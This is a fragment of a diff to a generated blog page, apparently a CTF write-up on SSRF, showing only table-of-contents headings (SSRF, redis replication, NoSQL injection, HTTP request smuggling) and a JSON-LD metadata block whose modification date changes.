2019]SSRF Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe"><span class="toc-text">[网鼎杯 2020 玄武组]SSRFMe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E7%9A%84%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-text">redis的主从复制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF-2021-hackme"><span class="toc-text">[GKCTF 2021]hackme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NoSQl"><span class="toc-text">NoSQl</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E8%A8%80%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-text">重言式注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-text">HTTP 请求走私</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CL%E4%B8%8D%E4%B8%BA0"><span class="toc-text">CL不为0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CL-CL"><span class="toc-text">CL-CL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CL-TE"><span class="toc-text">CL-TE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TE-CL"><span class="toc-text">TE-CL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TE-TE"><span class="toc-text">TE-TE</span></a></li></ol></li></ol></li></ol>
     </div>
   </section>
 
@@ -3256,7 +3430,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Jijoy的blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/02/23/ssrf/","name":"ssrf"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Jijoy的blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"ssrf","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/02/23/ssrf/"},"author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Jijoy的blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/02/23/ssrf/","wordCount":0,"datePublished":"2024-02-23T08:14:36.000Z","dateModified":"2024-03-08T12:53:40.964Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Jijoy的blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/02/23/ssrf/","name":"ssrf"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Jijoy的blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"ssrf","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/02/23/ssrf/"},"author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Jijoy的blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/02/23/ssrf/","wordCount":0,"datePublished":"2024-02-23T08:14:36.000Z","dateModified":"2024-03-21T09:21:48.486Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
